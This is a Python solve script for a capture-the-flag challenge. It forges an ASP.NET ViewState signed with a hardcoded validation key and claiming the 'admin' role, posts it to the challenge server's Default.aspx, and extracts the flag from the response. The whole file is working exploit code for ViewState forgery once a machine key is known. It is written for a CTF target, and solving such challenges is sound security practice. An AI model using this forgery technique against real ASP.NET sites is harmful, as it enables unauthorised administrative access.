#!/usr/bin/env python3

import base64
import hashlib
import hmac
import os
import re
import sys

import requests


TARGET = os.environ.get("TARGET", "http://chal.thjcc.org:31249").rstrip("/")
VALIDATION_KEY = bytes.fromhex(
    "F3690E7A9D8F4C2B1A5E6D7C8B9A0F1E2D3C4B5A69788796A5B4C3D2E1F0A9B8"
    "C7D6E5F4A3B2C1D0E9F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0A9B8"
)


def forged_viewstate(role: str, asset: str) -> str:
    # Format observed in the valid ViewState: header, length-prefixed role,
    # separator, length-prefixed asset, followed by HMAC-SHA1.
    body = (
        b"\xff\x01\x0c\x01"
        + bytes([len(role)])
        + role.encode()
        + b"\x01"
        + bytes([len(asset)])
        + asset.encode()
    )
    mac = hmac.new(VALIDATION_KEY, body, hashlib.sha1).digest()
    return base64.b64encode(body + mac).decode()


def main() -> int:
    url = f"{TARGET}/Default.aspx"
    viewstate = forged_viewstate("admin", "AST-4F2A9C0")
    try:
        response = requests.post(
            url,
            data={"__VIEWSTATE": viewstate},
            timeout=10,
        )
        response.raise_for_status()
    except requests.RequestException as exc:
        print(f"request gagal: {exc}", file=sys.stderr)
        return 1

    match = re.search(
        r"(?:THJCC\{[^{}]+\}|CTF\{[^{}]+\}|FLAG\{[^{}]+\})",
        response.text,
    )
    if not match:
        print("flag tidak ditemukan; response tidak sesuai ekspektasi", file=sys.stderr)
        return 1

    print(f"<FLAG>{match.group(0)}</FLAG>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
